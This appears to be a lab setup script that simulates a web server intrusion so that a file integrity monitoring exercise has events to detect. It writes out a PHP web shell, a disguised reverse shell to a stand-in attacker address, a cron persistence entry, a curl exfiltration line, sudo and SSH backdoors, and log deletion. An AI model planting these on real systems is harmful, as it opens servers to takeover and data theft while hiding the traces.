#!/bin/sh
# s6 service: once per container, after syscheck's baseline scan and real-time watch are up, play the
# intrusion on web-server-01: edit files, drop new ones, wipe the web logs. Then stay idle.
# The marker holds the epoch second the intrusion window closed; later FIM events are not the intruder's.
MARK=/var/lib/lab-intrusion-done
LOG=/var/ossec/logs/ossec.log
[ -f "$MARK" ] && exec sleep infinity
until grep -q 'Real-time file integrity monitoring started' "$LOG" 2>/dev/null \
   && grep -q 'File integrity monitoring scan ended' "$LOG" 2>/dev/null; do sleep 3; done
sleep 10
step() { sleep 3; }
edit() { f=$1; shift; "$@" < "$f" > /tmp/.lab-edit && cat /tmp/.lab-edit > "$f"; rm -f /tmp/.lab-edit; step; }

# Modified
edit /etc/ssh/sshd_config sed 's/^PermitRootLogin no$/PermitRootLogin yes/'
edit /etc/sudoers.d/webadmins sed '$a www-data ALL=(ALL) NOPASSWD: ALL'
edit /var/www/html/index.php sed '1a @include __DIR__ . "/uploads/.thumb.php";'
edit /usr/local/bin/backup-web.sh sed '$a curl -s -T /var/backups/www-$(date +%F).tar.gz http://203.0.113.47/u/ || true'

# Added
printf '%s\n' '<?php if (isset($_POST["c"])) { system($_POST["c"]); } ?>' > /var/www/html/uploads/.thumb.php; step
printf '%s\n' '#!/bin/sh' 'exec 3<>/dev/tcp/203.0.113.47/4444; sh <&3 >&3 2>&3' > /usr/local/bin/kworkerd
chmod 755 /usr/local/bin/kworkerd; step
printf '%s\n' '*/10 * * * * root /usr/local/bin/kworkerd >/dev/null 2>&1' > /etc/cron.d/kworker-update; step
printf '%s\n' 'cache warm-up placeholder' > /var/www/html/uploads/cache-001.txt; step

# Deleted: the web logs
rm -f /var/log/nginx/access.log; step
rm -f /var/log/nginx/access.log.1; step
rm -f /var/log/nginx/error.log; step

sleep 15
date +%s > "$MARK"
exec sleep infinity
